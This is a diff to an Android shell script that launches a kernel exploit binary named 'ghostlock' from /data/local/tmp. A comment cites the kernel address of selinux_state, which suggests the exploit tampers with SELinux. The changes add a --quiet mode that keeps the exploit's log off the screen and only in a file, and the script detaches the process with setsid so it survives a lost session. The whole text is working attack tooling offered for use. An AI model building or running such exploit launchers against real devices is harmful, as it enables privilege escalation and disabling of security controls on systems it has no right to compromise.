@@ -10,8 +10,12 @@
 #   selinux_state resolve to 0xffffff802b3f9990 on this build).
 #
 # Usage (from adb shell or a device terminal):
-#   sh /data/local/tmp/gl-w1/w1.sh              # background: start, wait for the
-#                                               # store, print the result, EXIT
+#   sh /data/local/tmp/gl-w1/w1.sh              # background: start, echo the log
+#                                               # live, wait for the store, print
+#                                               # the result, EXIT
+#   sh /data/local/tmp/gl-w1/w1.sh --quiet      # same, but keep the log OFF the
+#                                               # screen (only w1.log); still
+#                                               # prints the final result
 #   sh /data/local/tmp/gl-w1/w1.sh --foreground # block here instead (old behaviour)
 #   sh /data/local/tmp/gl-w1/w1.sh --status     # just report state, run nothing
 #
@@ -32,12 +36,14 @@
 DIR=/data/local/tmp/gl-w1
 LOG="$DIR/w1.log"
 MODE=background
+ECHO=1
 
 case "$1" in
     --foreground) MODE=foreground ;;
     --status)     MODE=status ;;
+    --quiet|-q)   ECHO=0 ;;
     "")           ;;
-    *) echo "usage: $0 [--foreground|--status]"; exit 2 ;;
+    *) echo "usage: $0 [--quiet|--foreground|--status]"; exit 2 ;;
 esac
 
 if [ "$MODE" = "status" ]; then
@@ -63,11 +69,15 @@ fi
 rm -f "$LOG"
 # The exploit writes to a *file*, not a pipe: if the terminal (or the adb session)
 # disappears mid-run, a pipe would give the exploit EPIPE/SIGPIPE, and this process
-# must never die on its own.  The screen mirror is done here by tailing the file,
-# so the log is visible live AND lands in $LOG for the record.
+# must never die on its own.  The screen mirror is done here by tailing the file
+# (unless --quiet), so the log is visible live AND lands in $LOG for the record.
 setsid ./ghostlock --profile "$DIR/profile.bin" >"$LOG" 2>&1 &
 PID=$!
-echo "W1: started pid=$PID -- log echoed below (also kept in $LOG)"
+if [ "$ECHO" = "1" ]; then
+    echo "W1: started pid=$PID -- log echoed below (also kept in $LOG)"
+else
+    echo "W1: started pid=$PID -- quiet: log only in $LOG"
+fi
 
 seen=0
 i=0
@@ -75,7 +85,9 @@ while [ $i -lt 90 ]; do                # 90 * 1s, the store takes ~11s
     total=$(wc -l < "$LOG" 2>/dev/null)
     [ -z "$total" ] && total=0
     if [ "$total" -gt "$seen" ]; then
-        tail -n +$((seen + 1)) "$LOG"
+        if [ "$ECHO" = "1" ]; then
+            tail -n +$((seen + 1)) "$LOG"
+        fi
         seen=$total
     fi
     if grep -q "Write 1 complete" "$LOG" 2>/dev/null; then
